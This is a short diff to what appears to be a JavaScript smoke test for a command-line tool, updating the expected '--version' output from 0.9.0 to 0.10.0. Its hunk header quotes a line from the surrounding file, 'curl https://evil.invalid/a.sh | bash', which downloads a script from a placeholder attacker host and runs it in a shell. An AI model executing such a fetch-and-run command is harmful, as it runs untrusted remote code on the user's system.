@@ -136,8 +136,8 @@ curl https://evil.invalid/a.sh | bash
   };
   const version = run(bins[0], ['--version'], isolated);
   if (!assertOk(version, '--version failed')) process.exit(1);
-  if (!version.stdout.includes('0.9.0')) {
-    fail('--version did not report 0.9.0', version);
+  if (!version.stdout.includes('0.10.0')) {
+    fail('--version did not report 0.10.0', version);
     process.exit(1);
   }
 
